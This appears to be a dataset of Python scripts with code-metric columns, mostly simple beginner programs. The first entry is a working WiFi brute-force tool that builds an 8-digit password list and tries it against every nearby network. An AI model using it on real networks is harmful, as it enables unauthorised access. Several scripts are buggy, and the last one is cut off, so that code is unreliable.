wifi hack by brutefore.py,"""""""
Introduction Description

The machine operating environment: system environment Win10, the operating environment Python3.6, run the tool Pycharm

Python packages need to have: pywifi

This is a brute wifi mode, the time required is longer, this paper provides a break ideas

Second, the idea of introduction

Mr. into a password dictionary (This step can also be downloaded from the Internet dictionary)

Cycle with each password password dictionary to try to connect Wifi, until success

Third, source design

1. password dictionary TXT file is generated, provided herein is relatively simple, practical crack passwords can be set according to the general, to generate relatively large relatively wide password dictionary

The following provides a simple 8 purely digital dictionary generation program codes
""""""




import itertools as its

# Problems encountered do not understand? Python learning exchange group: 821 460 695 meet your needs, data base files have been uploaded, you can download their own!

if __name__ == '__main__':
    words_num = ""1234567890""
    words_letter = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz""
    r = its.product(words_num, repeat=8)
    dic = open ( ""password-8 digits .txt"", ""w"")
    for i in r:
        dic.write("""".join(i))
        dic.write("""".join(""\n""))
    dic.close()
    
    
    
    
    
    
  #  2. brute force password when using longer
  
  
import pywifi
 
from pywifi import const # quote some definitions
 
import time
'''
 Problems encountered do not understand? Python learning exchange group: 821 460 695 meet your needs, data base files have been uploaded, you can download their own!
'''
 
def getwifi(wifilist, wificount):
    wifi = pywifi.PyWiFi () # crawled network interface cards
    ifaces = wifi.interfaces () [0] # Get the card
    ifaces.scan()
    time.sleep(8)
    bessis = ifaces.scan_results()
    allwifilist = []
    namelist = []
    ssidlist = []
    for data in bessis:
        if data.ssid not in namelist: # remove duplicate names WIFI
            namelist.append(data.ssid)
            allwifilist.append((data.ssid, data.signal))
    sorted(allwifilist, key=lambda st: st[1], reverse=True)
    time.sleep(1)
    n = 0
    if len(allwifilist) != 0:
        for item in allwifilist:
            if (item[0] not in ssidlist) & (item[0] not in wifilist):
                n = n + 1
                if n <= wificount:
                    ssidlist.append(item[0])
    print(allwifilist)
    return ssidlist
 
 
def getifaces():
    wifi = pywifi.PyWiFi () # crawled network interface cards
    ifaces = wifi.interfaces () [0] # Get the card
    ifaces.disconnect () # disconnect unlimited card connection
    return ifaces
 
 
def testwifi(ifaces, ssidname, password):
    profile = pywifi.Profile () # create a wifi connection file
    profile.ssid = ssidname # define wifissid
    profile.auth = open(const.AUTH_ALG_OPEN) # NIC
    profile.akm.append (const.AKM_TYPE_WPA2PSK) # wifi encryption algorithm
    #encrypting unit 
    profile.cipher = const.CIPHER_TYPE_CCMP #
    profile.key = password # wifi password
    ifaces.remove_all_network_profiles () # delete all other configuration files
    tmp_profile = ifaces.add_network_profile (profile) # load the configuration file
    ifaces.connect (tmp_profile) # wifi connection
    #You can connect to the inner (5) # 5 seconds time.sleep
    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False
 
 
def beginwork(wifinamelist):
    ifaces = getifaces()
    path = r # password-8 digits .txt
    # Path = r ""password- commonly used passwords .txt""
    files = open(path, 'r')
    while True:
        try:
            password = files.readline()
            password = password.strip('\n')
            if not password:
                break
            for wifiname in wifinamelist:
                print ( ""are trying to:"" + wifiname + "","" + password)
                if testwifi(ifaces, wifiname, password):
                    print ( ""Wifi account:"" + wifiname + "", Wifi password:"" + password)
                    wifinamelist.remove(wifiname)
                    break
                if not wifinamelist:
                    break
        except:
            continue
    files.close()
 
 
if __name__ == '__main__':
    wifinames_e = [ """", ""Vrapile""] # exclude wifi name does not crack
    wifinames = getwifi(wifinames_e, 5)
    print(wifinames)
    beginwork(wifinames)
    
    
    
    
    
    
",4500,85,82,40,23,5,15,4.0,17,18,7,34.0,28,,52,154.25742227201613,266.72271688113824,4.25,medio,No,False,False,Medium,id253
Deleting record in a binary file.py,"import pickle


def bdelete():
    # Opening a file & loading it
    with open(""studrec.dat"") as F:
        stud = pickle.load(F)
        print(stud)

    # Deleting the Roll no. entered by user
    rno = int(input(""Enter the Roll no. to be deleted: ""))
    with open(""studrec.dat"") as F:
        rec = [i for i in stud if i[0] != rno]
        pickle.dump(rec, F)


bdelete()
",393,10,10,5,2,2,0,1.0,3,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,True,False,Low,id254
multiplication_table.py,"""""""
The 'multiplication table' Implemented in Python 3

Syntax:
python3 multiplication_table.py [rows columns]
Separate filenames with spaces as usual.

Updated by Borys Baczewski (BB_arbuz on GitHub) - 06/03/2022
""""""

from sys import argv  # import argument variable

(
    script,
    rows,
    columns,
) = argv  # define rows and columns for the table and assign them to the argument variable


def table(rows, columns):
    columns = int(columns)
    rows = int(rows)
    for r in range(1, rows+1):
        c = r
        print(r, end='\t')
        i = 0
        while columns-1 > i:
            print(c+r, end='\t')
            c = c+r
            i += 1
        print('\n')


table(rows, columns)
",703,16,19,8,2,0,7,1.0,3,6,3,12.0,7,10.0,18,24.406371956566694,59.794705707972525,2.571428571428572,alto,No,False,False,Low,id255
Base Converter Number system.py,"def base_check(xnumber, xbase):
    for char in xnumber[len(xnumber) - 1]:
        if int(char) >= int(xbase):
            return False
    return True


def convert_from_10(xnumber, xbase, arr, ybase):
    if int(xbase) == 2 or int(xbase) == 4 or int(xbase) == 6 or int(xbase) == 8:

        if xnumber == 0:
            return arr
        else:
            quotient = int(xnumber) // int(xbase)
            remainder = int(xnumber) % int(xbase)
            arr.append(remainder)
            dividend = quotient
            convert_from_10(dividend, xbase, arr, base)
    elif int(xbase) == 16:
        if int(xnumber) == 0:
            return arr
        else:
            quotient = int(xnumber) // int(xbase)
            remainder = int(xnumber) % int(xbase)
            if remainder > 9:
                if remainder == 10:
                    remainder = ""A""
                if remainder == 11:
                    remainder = ""B""
                if remainder == 12:
                    remainder = ""C""
                if remainder == 13:
                    remainder = ""D""
                if remainder == 14:
                    remainder = ""E""
                if remainder == 15:
                    remainder = ""F""
            arr.append(remainder)
            dividend = quotient
            convert_from_10(dividend, xbase, arr, ybase)


def convert_to_10(xnumber, xbase, arr, ybase):
    if int(xbase) == 10:
        for char in xnumber:
            arr.append(char)
        flipped = arr[::-1]
        ans = 0
        j = 0

        for i in flipped:
            ans = ans + (int(i) * (int(ybase) ** j))
            j = j + 1
        return ans


arrayfrom = []
arrayto = []
is_base_possible = False
number = input(""Enter the number you would like to convert: "")

while not is_base_possible:
    base = input(""What is the base of this number? "")
    is_base_possible = base_check(number, base)
    if not is_base_possible:
        print(f""The number {number} is not a base {base} number"")
        base = input
    else:
        break
dBase = input(""What is the base you would like to convert to? "")
if int(base) == 10:
    convert_from_10(number, dBase, arrayfrom, base)
    answer = arrayfrom[::-1]  # reverses the array
    print(f""In base {dBase} this number is: "")
    print(*answer, sep="""")
elif int(dBase) == 10:
    answer = convert_to_10(number, dBase, arrayto, base)
    print(f""In base {dBase} this number is: {answer} "")
else:
    number = convert_to_10(number, 10, arrayto, base)
    convert_from_10(number, dBase, arrayfrom, base)
    answer = arrayfrom[::-1]
    print(f""In base {dBase} this number is: "")
    print(*answer, sep="""")
",2661,78,75,9,1,0,0,3.0,22,33,12,63.0,51,,96,332.3132424492002,573.818872655992,7.411764705882353,bajo,No,True,False,Medium-High,id256
MobiusFunction.py,"def is_square_free(factors):
    """"""
    This functions takes a list of prime factors as input.
    returns True if the factors are square free.
    """"""
    for i in factors:
        if factors.count(i) > 1:
            return False
    return True


def prime_factors(n):
    """"""
    Returns prime factors of n as a list.
    """"""
    i = 2
    factors = []
    while i * i <= n:
        if n % i:
            i += 1
        else:
            n //= i
            factors.append(i)
    if n > 1:
        factors.append(n)
    return factors


def mobius_function(n):
    """"""
    Defines Mobius function
    """"""
    factors = prime_factors(n)
    if is_square_free(factors):
        if len(factors) % 2 == 0:
            return 1
        elif len(factors) % 2 != 0:
            return -1
    else:
        return 0
",813,29,26,4,0,0,10,3.0,11,12,9,23.0,13,,35,76.63504134881501,156.0801066523054,7.961538461538462,medio,No,False,False,Medium,id257
QuadraticCalc.py,"# GGearing
# 02/10/2017
# Simple script to calculate the quadratic formula of a sequence of numbers and
# recognises when the sequence isn't quadratic


def findLinear(numbers):  # find a & b of linear sequence
    a = numbers[1] - numbers[0]
    a1 = numbers[2] - numbers[1]
    if a1 == a:
        b = numbers[0] - a
        return (a, b)
    else:
        print(""Sequence is not linear"")


sequence = []
first_difference = []
second_difference = []
for i in range(4):  # input
    term = str(i + 1)
    inp = int(input(""Enter term "" + term + "": ""))
    sequence.append(inp)

for i in range(3):
    gradient = sequence[i + 1] - sequence[i]
    first_difference.append(gradient)
for i in range(2):
    gradient = first_difference[i + 1] - first_difference[i]
    second_difference.append(gradient)

if second_difference[0] == second_difference[1]:  # checks to see if consistent
    a = second_difference[0] / 2
    subs_diff = []
    for i in range(4):
        n = i + 1
        num = a * (n * n)
        subs_diff.append((sequence[i]) - num)
    b, c = findLinear(subs_diff)
    print(
        ""Nth term: "" + str(a) + ""n^2 + "" + str(b) + ""n + "" + str(c)
    )  # outputs nth term
else:
    print(""Sequence is not quadratic"")
",1272,32,34,6,8,4,0,1.0,2,22,5,44.0,36,,66,197.72694052636004,353.5984323047935,3.055555555555556,medio,No,True,False,Medium,id258
pieces.py,"""""""
Author : Dhruv B Kakadiya

""""""

from .statics import *
import pygame as pg


class pieces:

    padding = 17
    outline = 2

    def __init__(self, row, col, color):
        self.row = row
        self.col = col
        self.color = color
        self.king = False

        """"""if (self.color == yellow):
            self.direction = -1
        else:
            self.direction = 1""""""

        self.x = self.y = 0
        self.calculate_pos()

    # calculate the positions
    def calculate_pos(self):
        self.x = (sq_size * self.col) + (sq_size // 2)
        self.y = (sq_size * self.row) + (sq_size // 2)

    # for making king
    def make_king(self):
        self.king = True

    def draw(self, window):
        radd = (sq_size // 2) - self.padding
        pg.draw.circle(window, gray, (self.x, self.y), radd + self.outline)
        pg.draw.circle(window, self.color, (self.x, self.y), radd)
        if self.king:
            window.blit(
                crown,
                ((self.x - crown.get_width() // 2), (self.y - crown.get_height() // 2)),
            )

    def move(self, row, col):
        self.row = row
        self.col = col
        self.calculate_pos()

    # represtation as a string
    def __repr__(self):
        return str(self.color)
",1273,31,32,13,3,3,7,6.0,9,13,4,26.0,20,,39,94.43856189774723,178.81353752812512,2.6,medio,Yes,False,False,Low,id259
one_rep_max_calculator_gui.py,"import tkinter as tk


class OneRepMaxCalculator:
    """"""
    A class used to calculate the estimated one-repetition maximum (1RM) for a weightlifting exercise.

    Attributes
    ----------
    window : tk.Tk
        The main window of the application.
    weight_entry : tk.Entry
        Entry field to input the weight lifted.
    rep_entry : tk.Entry
        Entry field to input the number of reps performed.
    result_value_label : tk.Label
        Label to display the calculated 1RM.

    Methods
    -------
    calculate_1rm():
        Calculates the estimated 1RM based on the Epley formula.
    display_result():
        Displays the calculated 1RM in the application window.
    run():
        Runs the application.
    """"""

    def __init__(self):
        """"""Initializes the OneRepMaxCalculator with a window and widgets.""""""
        self.window = tk.Tk()
        self.window.title(""One-Rep Max Calculator"")
        self.window.geometry(""300x150"")

        # Create and pack widgets
        tk.Label(self.window, text=""Enter the weight you lifted (in kg):"").pack()
        self.weight_entry = tk.Entry(self.window)
        self.weight_entry.pack()

        tk.Label(self.window, text=""Enter the number of reps you performed:"").pack()
        self.rep_entry = tk.Entry(self.window)
        self.rep_entry.pack()

        tk.Button(self.window, text=""Calculate"", command=self.display_result).pack()

        tk.Label(self.window, text=""Your estimated one-rep max (1RM):"").pack()
        self.result_value_label = tk.Label(self.window)
        self.result_value_label.pack()

    def calculate_1rm(self):
        """"""Calculates and returns the estimated 1RM.""""""
        weight = int(self.weight_entry.get())
        reps = int(self.rep_entry.get())
        return (weight * reps * 0.0333) + weight

    def display_result(self):
        """"""Calculates the 1RM and updates result_value_label with it.""""""
        one_rep_max = self.calculate_1rm()
        self.result_value_label.config(text=f""{one_rep_max} kg"")

    def run(self):
        """"""Runs the Tkinter event loop.""""""
        self.window.mainloop()


# Usage
if __name__ == ""__main__"":
    calculator = OneRepMaxCalculator()
    calculator.run()

# Improve the program.
# Make the fonts, bigger.
# - Use text formatting...
# Use dark mode.
# Have an option to use dark mode and light mode.
",2356,33,28,15,7,11,21,4.0,6,4,3,8.0,7,,12,24.406371956566694,39.86313713864836,1.7142857142857142,alto,Yes,False,False,Low,id260
addition.py,"print()
print()

a = True

while a == True:

    number1 = int(input(""enter first number:""))
    number2 = int(input(""enter second number:""))
    number3 = int(input(""enter third number:""))
    sum = number1 + number2 + number3

    print()
    print(""\t\t======================================"")
    print()

    print(""Addition of three numbers is"", "" :-- "", sum)

    print()
    print(""\t\t======================================"")
    print()

    d = input(""Do tou want to do it again ??   Y / N -- "").lower()

    if d == ""y"":

        print()
        print(""\t\t======================================"")
        print()

        continue

    else:

        exit()
",671,23,23,12,0,0,0,0.0,0,4,2,8.0,8,,12,26.0,39.86313713864836,1.0,medio,No,True,False,Low,id261
gstin_scraper.py,"from bs4 import BeautifulSoup
import requests
import time

# Script Name		: gstin_scraper.py
# Author				: Purshotam
# Created				: Sep 6, 2021 7:59â¯PM
# Last Modified		: Oct 3, 2023 6:28â¯PM
# Version				: 1.0
# Modifications		:
"""""" Description	:
GSTIN, short for Goods and Services Tax Identification Number, 
is a unique 15 digit identification number assigned to every taxpayer 
(primarily dealer or supplier or any business entity) registered under the GST regime.
This script is able to fetch GSTIN numbers for any company registered in the
Mumbai / Banglore region.
""""""


# Using a demo list in case of testing the script. 
# This list will be used in case user skips ""company input"" dialogue by pressing enter.
demo_companies = [""Bank of Baroda"", ""Trident Limited"", ""Reliance Limited"", ""The Yummy Treat"", ""Yes Bank"", ""Mumbai Mineral Trading Corporation""]

def get_company_list():
    company_list = []
    
    while True:
        company = input(""Enter a company name (or press Enter to finish): "")
        if not company:
            break
        company_list.append(company)
    
    return company_list

def fetch_gstins(company_name, csrf_token):
    third_party_gstin_site = ""https://www.knowyourgst.com/gst-number-search/by-name-pan/""
    payload = {'gstnum': company_name, 'csrfmiddlewaretoken': csrf_token}

    # Getting the HTML content and extracting the GSTIN content using BeautifulSoup.
    html_content = requests.post(third_party_gstin_site, data=payload)
    soup = BeautifulSoup(html_content.text, 'html.parser')
    site_results = soup.find_all(id=""searchresult"")

    # Extracting GSTIN specific values from child elements.
    gstins = [result.strong.next_sibling.next_sibling.string for result in site_results]

    return gstins

def main():
    temp = get_company_list()
    companies = temp if temp else demo_companies

    all_gstin_data = """"
    third_party_gstin_site = ""https://www.knowyourgst.com/gst-number-search/by-name-pan/""

    # Getting the CSRF value for further RESTful calls.
    page_with_csrf = requests.get(third_party_gstin_site)
    soup = BeautifulSoup(page_with_csrf.text, 'html.parser')
    csrf_token = soup.find('input', {""name"": ""csrfmiddlewaretoken""})['value']

    for company in companies:
        gstins = fetch_gstins(company, csrf_token)

        # Only include GSTINs for Bengaluru and Mumbai-based companies
        comma_separated_gstins = ', '.join([g for g in gstins if g.startswith(('27', '29'))])

        all_gstin_data += f""{company} = {comma_separated_gstins}\n\n""

        # Delaying for false DDOS alerts on the third-party site
        time.sleep(0.5)

    # Printing the data
    print(all_gstin_data)

if __name__ == ""__main__"":
    main()
",2725,39,36,19,14,14,7,3.0,10,3,3,5.0,5,,8,16.36452797660028,24.0,1.5,alto,No,True,False,Low,id262
Binary_to_Decimal.py,"# Program to convert binary to decimal


def binaryToDecimal(binary):
    """"""
    >>> binaryToDecimal(111110000)
    496
    >>> binaryToDecimal(10100)
    20
    >>> binaryToDecimal(101011)
    43
    """"""
    decimal, i, n = 0, 0, 0
    while binary != 0:
        dec = binary % 10
        decimal = decimal + dec * pow(2, i)
        binary = binary // 10
        i += 1
    print(decimal)


binaryToDecimal(100)
",414,10,9,4,1,1,8,1.0,2,6,5,12.0,9,,18,40.13896548741762,68.53238859703687,3.333333333333333,alto,No,False,False,Low,id263
run.py,"from settings import key
import requests
import os

date = input(""Enter date(YYYY-MM-DD): "")
r = requests.get(f""https://api.nasa.gov/planetary/apod?api_key={key}&date={date}"")
parsed = r.json()
title = parsed[""title""]
url = parsed[""hdurl""]
print(f""{title}: {url}"")

img_ = requests.get(url, stream=True)
print(img_.headers)
print(img_.headers[""content-type""], img_.headers[""content-length""])
content_type = img_.headers[""content-type""]

if img_.status_code == 200 and (
    content_type == ""image/jpeg""
    or content_type == ""image/gif""
    or content_type == ""image/png""
):
    ext = img_.headers[""content-type""][6:]
    if not os.path.exists(""img/""):
        os.mkdir(""img/"")
    path = f""img/apod_{date}.{ext}""
    with open(path, ""wb"") as f:
        for chunk in img_:
            f.write(chunk)
",801,22,25,3,0,0,0,0.0,0,7,4,14.0,12,16.0,21,51.01955000865388,84.0,2.333333333333333,medio,No,True,False,Low,id264
coronacases.py,"import sys

try:
    import requests
except ImportError:
    print(""Please Install Requests Module With Command 'pip install requests'"")
    sys.exit(1)
from time import sleep

url = ""https://api.covid19api.com/summary""
visit = requests.get(url).json()

NewConfirmed = visit[""Global""][""NewConfirmed""]
TotalConfirmed = visit[""Global""][""TotalConfirmed""]
NewDeaths = visit[""Global""][""NewDeaths""]
TotalDeaths = visit[""Global""][""TotalDeaths""]
NewRecovered = visit[""Global""][""NewRecovered""]
TotalRecovered = visit[""Global""][""TotalRecovered""]

india = visit[""Countries""]
name = india[76][""Country""]
indiaconfirmed = india[76][""NewConfirmed""]
indiatotal = india[76][""TotalConfirmed""]
indiaDeaths = india[76][""NewDeaths""]
deathstotal = india[76][""TotalDeaths""]
indianewr = india[76][""NewRecovered""]
totalre = india[76][""TotalRecovered""]
DateUpdate = india[76][""Date""]


def world():
    world = f""""""
âââââ ââââ âââââ ââââ âââ ã âââââ ââââ âââ âââ âââ ã âââ ââââ ã ââââââ ââââ ââââ âââ ââââ 
âââââ ââââ âââââ ââââ âââ ã âââââ ââââ âââ âââ âââ ã âââ ââââ ã ââââââ ââââ ââââ âââ ââââ 
âââââ ââââ âââââ ââââ âââ ã âââââ ââââ âââ âââ âââ ã âââ ââââ ã ââââââ ââââ ââââ âââ ââââ\n
New Confirmed Cases :- {NewConfirmed}
Total Confirmed Cases :- {TotalConfirmed}
New Deaths :- {NewDeaths}
Total Deaths :- {TotalDeaths}
New Recovered :- {NewRecovered}
Total Recovered :- {TotalRecovered}
    """"""
    print(world)


def indiac():
    cases = f""""""
âââââââââââââââââââââââââââââââ
âââââââââââââââââââââââââââââââ
âââââââââââââââââââââââââââââââ
âââââââââââââââââââââââââââââââ
âââââââââââââââââââââââââââââââ
âââââââââââââââââââââââââââââââ

Country Name :- {name}
New Confirmed Cases :- {indiaconfirmed}
Total Confirmed Cases :- {indiatotal}
New Deaths :- {indiaDeaths}
Total Deaths :- {deathstotal}
New Recovered :- {indianewr}
Total Recovered :- {totalre}
Information Till :- {DateUpdate}
""""""
    print(cases)


print(
    """"""
ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ""""""
)
print(""\nDeveloped By @TheDarkW3b"")


def choices():
    print(""\n1 - To Know Corona Virus Update Across World"")
    print(""\n2 - To Know Corona Virus Update In India"")
    choice = input(""Enter 1 Or 2 :- "")

    if choice == ""1"":
        world()
        sleep(1)
        choices()
    elif choice == ""2"":
        indiac()
        sleep(1)
        choices()
    else:
        print(""\nYou Have Entered Something Wrong, Please Enter Again"")
        choices()


choices()
",4765,48,81,16,0,0,0,3.0,5,2,1,4.0,3,,6,4.754887502163469,12.0,0.6666666666666666,medio,No,True,False,Low,id265
Snake-Water-Gun-Game.py,"""""""
This is a snake water gun game similar to rock paper scissor
In this game :
if computer chooses snake and user chooses water, the snake will drink water and computer wins.
If computer chooses gun and user chooses water, the gun gets drown into water and user wins.
And so on for other cases
""""""

# you can use this code also, see this code is very short in compare to your code
# code starts here
""""""
# Snake || Water || Gun __ Game
import random
times = 10 # times to play game
comp_choice = [""s"",""w"",""g""] # output choice for computer
user_point = 0 # user point is initially marked 0
comp_point = 0 # computer point is initially marked 0
while times >= 1:
    comp_rand = random.choice(comp_choice) # output computer will give
    #
    # print(comp_rand) # checking if the code is working or not
    print(f""ROUND LEFT = {times}"")
# checking if the input is entered correct or not
    try:
        user_choice = input(""Enter the input in lowercase ex. \n (snake- s) (water- w) (gun- w)\n:- "") # user choice, the user will input
    except Exception as e:
        print(e)
# if input doen't match this will run
    if user_choice != 's' and user_choice != 'w' and user_choice != 'g':
            print(""Invalid input, try again\n"")
            continue
# checking the input and calculating score
    if comp_rand == 's':
        if user_choice == 'w':
            comp_point += 1
        elif user_choice == 'g':
            user_point += 1

    elif comp_rand == 'w':
        if user_choice == 'g':
            comp_point += 1
        elif user_choice == 's':
            user_point += 1

    elif comp_rand == 'g':
        if user_choice == 's':
            comp_point += 1
        elif user_choice == 'w':
            user_point += 1

    times -=1 # reducing the number of rounds after each match
if user_point>comp_point: # if user wins
    print(f""WOOUUH! You have win \nYour_point = {user_point}\nComputer_point = {comp_point}"")
elif comp_point>user_point: # if computer wins
    print(f""WE RESPECT YOUR HARD WORK, BUT YOU LOSE AND YOU ARE A LOSER NOW! \nYour_point = {user_point}\nComputer_point = {comp_point}"")
elif comp_point==user_point: # if match draw
    print(f""MATCH DRAW\nYour_point = {user_point}\nComputer_point = {comp_point}"")
else: # just checked
    print(""can't calculate score"")
exit = input(""PRESS ENTER TO EXIT"")
""""""  # code ends here
import random

# import time

choices = {""S"": ""Snake"", ""W"": ""Water"", ""G"": ""Gun""}

x = 0
comp_point = 0
user_point = 0
match_draw = 0

print(""Welcome to the Snake-Water-Gun Game\n"")
print(""I am Mr. Computer, We will play this game 10 times"")
print(""Whoever wins more matches will be the winner\n"")

while x < 10:
    print(f""Game No. {x+1}"")
    for key, value in choices.items():
        print(f""Choose {key} for {value}"")

    comp_rand = random.choice(list(choices.keys())).lower()
    user_choice = input(""\n----->"").lower()
    print(""Mr. Computer's choice is : "" + comp_rand)

    # you can use this code to minimize your writing time for the code
    """"""
    if comp_rand == 's':
        if user_choice == 'w':
            print(""\n-------Mr. Computer won this round--------"")
            comp_point += 1
        elif user_choice == 'g':
            print(""\n-------You won this round-------"")
            user_point += 1
        else:
            match_draw +=1

    elif comp_rand == 'w':
        if user_choice == 'g':
            print(""\n-------Mr. Computer won this round--------"")
            comp_point += 1
        elif user_choice == 's':
            print(""\n-------You won this round-------"")
            user_point += 1
        else:
            match_draw +=1

    elif comp_rand == 'g':
        if user_choice == 's':
            print(""\n-------Mr. Computer won this round--------"")
            comp_point += 1
        elif user_choice == 'w':
            print(""\n-------You won this round-------"")
            user_point += 1
        else:
            match_draw +=1

    """"""

    if comp_rand == ""s"":
        if user_choice == ""w"":
            print(""\n-------Mr. Computer won this round--------"")
            comp_point += 1
            x += 1
        elif user_choice == ""g"":
            print(""\n-------You won this round-------"")
            user_point += 1
            x += 1
        else:
            print(""\n-------Match draw-------"")
            match_draw += 1
            x += 1

    elif comp_rand == ""w"":
        if user_choice == ""g"":
            print(""\n-------Mr. Computer won this round--------"")
            comp_point += 1
            x += 1
        elif user_choice == ""s"":
            print(""\n-------You won this round-------"")
            user_point += 1
            x += 1
        else:
            print(""\n-------Match draw-------"")
            match_draw += 1
            x += 1

    elif comp_rand == ""g"":
        if user_choice == ""s"":
            print(""\n-------Mr. Computer won this round--------"")
            comp_point += 1
            x += 1
        elif user_choice == ""w"":
            print(""\n-------You won this round-------"")
            user_point += 1
            x += 1
        else:
            print(""\n-------Match draw-------"")
            match_draw += 1
            x += 1

print(""Here are final stats of the 10 matches : "")
print(f""Mr. Computer won : {comp_point} matches"")
print(f""You won : {user_point} matches"")
print(f""Matches Drawn : {match_draw}"")

if comp_point > user_point:
    print(""\n-------Mr. Computer won-------"")

elif comp_point < user_point:
    print(""\n-----------You won-----------"")

else:
    print(""\n----------Match Draw----------"")
",5778,69,113,21,5,4,36,0.0,0,32,4,64.0,12,,96,51.01955000865388,384.0,10.666666666666666,medio,No,True,True,Medium-High,id266
Bubble_Sorting_Prog.py,"def bubblesort(list):

    # Swap the elements to arrange in order
    for iter_num in range(len(list) - 1, 0, -1):
        for idx in range(iter_num):
            if list[idx] > list[idx + 1]:
                temp = list[idx]
                list[idx] = list[idx + 1]
                list[idx + 1] = temp


list = [19, 2, 31, 45, 6, 11, 121, 27]
bubblesort(list)
print(list)
",376,10,10,3,1,1,0,1.0,4,6,4,11.0,5,,17,19.60964047443681,53.88872502451932,4.4,alto,No,False,False,Low,id267
tweeter.py,"""""""
Author: Shreyas Daniel (shreydan)
Install: tweepy - ""pip install tweepy""
API: Create a twitter app ""apps.twitter.com"" to get your OAuth requirements.
Version: 1.0

Tweet text and pics directly from the terminal.
""""""
from __future__ import print_function

import os

import tweepy

try:
    input = raw_input
except NameError:
    pass


def getStatus():
    lines = []
    while True:
        line = input()
        if line:
            lines.append(line)
        else:
            break
    status = ""\n"".join(lines)
    return status


def tweetthis(type):
    if type == ""text"":
        print(""Enter your tweet "" + user.name)
        tweet = getStatus()
        try:
            api.update_status(tweet)
        except Exception as e:
            print(e)
            return
    elif type == ""pic"":
        print(""Enter pic path "" + user.name)
        pic = os.path.abspath(input())
        print(""Enter status "" + user.name)
        title = getStatus()
        try:
            api.update_with_media(pic, status=title)
        except Exception as e:
            print(e)
            return

    print(""\n\nDONE!!"")


def initialize():
    global api, auth, user
    ck = ""here""  # consumer key
    cks = ""here""  # consumer key SECRET
    at = ""here""  # access token
    ats = ""here""  # access token SECRET

    auth = tweepy.OAuthHandler(ck, cks)
    auth.set_access_token(at, ats)

    api = tweepy.API(auth)
    user = api.me()


def main():
    doit = int(input(""\n1. text\n2. picture\n""))
    initialize()
    if doit == 1:
        tweetthis(""text"")
    elif doit == 2:
        tweetthis(""pic"")
    else:
        print(""OK, Let's try again!"")
        main()


main()
",1679,59,58,17,4,0,7,4.0,12,7,2,14.0,10,,21,35.219280948873624,75.28421251514429,1.4,medio,No,True,False,Low,id268
Luhn_Algorithm.py,"#!/usr/bin/env python3

""""""
Python Program using the Luhn Algorithm

This program uses the Luhn Algorithm, named after its creator
Hans Peter Luhn, to calculate the check digit of a 10-digit
""payload"" number, and output the final 11-digit number.

To prove this program correctly calculates the check digit,
the input 7992739871 should return:

Sum of all digits: 67
Check digit: 3
Full valid number (11 digits): 79927398713

11/15/2021
David Costell (DontEatThemCookies on GitHub)
""""""

# Input
CC = input(""Enter number to validate (e.g. 7992739871): "")
if len(CC) < 10 or len(CC) > 10:
    input(""Number must be 10 digits! "")
    exit()

# Use list comprehension to split the number into individual digits
split = [int(split) for split in str(CC)]

# List of digits to be multiplied by 2 (to be doubled)
tobedoubled = [split[1], split[3], split[5], split[7], split[9]]
# List of remaining digits not to be multiplied
remaining = [split[0], split[2], split[4], split[6], split[8]]

# Step 1
# Double all values in the tobedoubled list
# Put the newly-doubled values in a new list
newdoubled = []
for i in tobedoubled:
    i = i * 2
    newdoubled.append(i)
tobedoubled = newdoubled

# Check for any double-digit items in the tobedoubled list
# Splits all double-digit items into two single-digit items
newdoubled = []
for i in tobedoubled:
    if i > 9:
        splitdigit = str(i)
        for index in range(0, len(splitdigit), 1):
            newdoubled.append(splitdigit[index : index + 1])
        tobedoubled.remove(i)
newdoubled = [int(i) for i in newdoubled]

# Unify all lists into one (luhnsum)
luhnsum = []
luhnsum.extend(tobedoubled)
luhnsum.extend(newdoubled)
luhnsum.extend(remaining)

# Output
print(""Final digit list:"", luhnsum)
print(""Sum of all digits:"", sum(luhnsum))
checkdigit = 10 - sum(luhnsum) % 10
print(""Check digit:"", checkdigit)
finalcc = str(CC) + str(checkdigit)
print(""Full valid number (11 digits):"", finalcc)
input()
",2017,33,31,12,12,12,13,0.0,0,9,7,18.0,14,,27,72.95445336320968,118.59257041502654,4.5,medio,No,True,False,Low-Medium,id269
gui_calculator.py,"# Calculator
from tkinter import *

w = Tk()
w.geometry(""500x500"")
w.title(""Calculatorax"")
w.configure(bg=""#03befc"")

# Functions(Keypad)
def calc1():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn1[""text""]
    txt1.insert(0, b1)


def calc2():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn2[""text""]
    txt1.insert(0, b1)


def calc3():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn3[""text""]
    txt1.insert(0, b1)


def calc4():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn4[""text""]
    txt1.insert(0, b1)


def calc5():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn5[""text""]
    txt1.insert(0, b1)


def calc6():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn6[""text""]
    txt1.insert(0, b1)


def calc7():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn7[""text""]
    txt1.insert(0, b1)


def calc8():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn8[""text""]
    txt1.insert(0, b1)


def calc9():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn9[""text""]
    txt1.insert(0, b1)


def calc0():
    b = txt1.get()
    txt1.delete(0, END)
    b1 = b + btn0[""text""]
    txt1.insert(0, b1)


# Functions(operators)

x = 0


def add():
    global x
    add.b = eval(txt1.get())
    txt1.delete(0, END)
    x = x + 1


def subtract():
    global x
    subtract.b = eval(txt1.get())
    txt1.delete(0, END)
    x = x + 2


def get():
    b = txt1.get()


def equals():
    global x
    if x == 1:
        c = (eval(txt1.get())) + add.b
        cls()
        txt1.insert(0, c)

    elif x == 2:
        c = subtract.b - (eval(txt1.get()))
        cls()
        txt1.insert(0, c)

    elif x == 3:
